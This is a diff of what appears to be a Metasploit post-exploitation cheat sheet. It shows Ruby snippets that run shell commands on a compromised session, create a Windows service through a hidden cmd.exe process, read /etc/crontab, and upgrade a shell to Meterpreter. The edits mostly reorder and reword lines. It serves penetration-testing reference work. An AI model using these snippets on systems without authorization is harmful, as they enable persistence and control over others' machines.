@@ -143,9 +143,8 @@
 
 - **execute bash commands (/bin/sh)**
 
-      cmd_exec("mkdir -m 700 -p /root/test.s")
       cmd_exec("sh /root/test.sh")
-      system("msfconsole -x 'db_status'")
+      cmd_exec("mkdir -m 700 -p /root/test.s")
 
 - **Execute remote command (windows)**
 
@@ -153,14 +152,13 @@
 
 - **Use backslash(s) to escape special caracters ["*\$!]**
 
-      print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"")
       proc = session.sys.process.execute("cmd.exe /c sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"", nil, {'Hidden' => true})
 
 - **The shell.read() method provides the ability to read output from a shell session.**
 
       session.shell_read("/etc/crontab")
 
-- **The session.shell_upgrade method will attempt to spawn a new Meterpreter session through an existing Shell session.**<br />
+- **session.shell_upgrade will attempt to spawn a new Meterpreter session through an existing Shell session.**<br />
 'This requires that a multi/handler be running and that the host and port of this handler is provided to this method.'
 
       session.shell_upgrade
